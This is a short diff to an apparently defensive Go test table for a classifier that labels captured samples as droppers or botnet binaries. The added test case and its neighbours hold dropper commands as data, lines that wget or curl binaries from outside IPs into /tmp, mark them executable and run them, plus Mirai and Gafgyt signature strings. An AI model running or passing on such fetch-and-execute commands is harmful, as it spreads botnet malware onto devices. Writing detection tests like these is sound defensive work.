@@ -11,6 +11,7 @@ func TestClasificar(t *testing.T) {
 		quiero string
 	}{
 		{"dropper", "#!/bin/sh\nwget http://1.2.3.4/x.arm7\nchmod +x x.arm7\n./x.arm7\n", "Script (#!/bin/sh)", 60, "dropper"},
+		{"dropper sin shebang", "cd /tmp; wget http://2.26.136.128/tarm7; chmod +x tarm7; ./tarm7", "Texto", 80, "dropper"},
 		{"dropper multiarch", "#!/bin/sh\ncurl http://a/bins/arm7; curl http://a/bins/mips; curl http://a/bins/x86\n", "Script (#!/bin/sh)", 90, "dropper"},
 		{"botnet mips", "basura binaria", "Ejecutable de Linux (ELF) MIPS", 60000, "botnet"},
 		{"botnet firma", "algo mirai gafgyt dentro", "Ejecutable de Linux (ELF) x86-64", 40000, "botnet"},
